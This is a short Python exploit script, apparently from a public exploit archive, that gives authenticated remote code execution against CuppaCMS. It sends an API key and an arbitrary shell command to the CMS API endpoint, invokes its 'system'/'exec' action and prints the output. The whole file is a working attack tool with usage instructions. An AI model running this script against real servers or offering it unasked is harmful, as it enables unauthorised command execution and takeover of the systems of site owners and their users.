#!/usr/bin/env python3 

# Vulnerable application: CuppaCMS
# Exploit title: Authenticated Remote Code Execution.
# Test platform: Debian 10 + APACHE2 + PHP/7.3
# Date: Jan 25, 2022
# Exploit author: Mohd. Badrudduja
# Example usage: python3 exploit.py "IP_ADDRESS" "API-KEY" "COMMAND"

import requests
import argparse

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", type=str, metavar="IP ADDRESS", help="Please enter target IP.")
    parser.add_argument("key", type=str, metavar="KEY", help="Please enter API-Key.")
    parser.add_argument("cmd", type=str, metavar="COMMAND", help="Please enter command to execute")
    args = parser.parse_args()
    
    ip_address = args.ip
    api_key = args.key
    command = args.cmd
    
    url = ("http://" + ip_address + "/cuppa/api/index.php")
    print("[+] Testing url: " + url + "\n")
    headers = {'key': api_key}
    data = {'action': 'system', 'function': 'exec', 'cmd': command}
    
    r = requests.post(url=url, headers=headers, data=data, verify=False)
    res = r.text
    
    if len(res) > 2:
        print(res)
    else:
        print("[-] Check you command again.")

if __name__ == "__main__":
    print("Example usage: python3 exploit.py <IP_ADDRESS> <API-KEY> <COMMAND>")
    print("Info: It better to pass all arguments values in double quotes. \n")
    main()
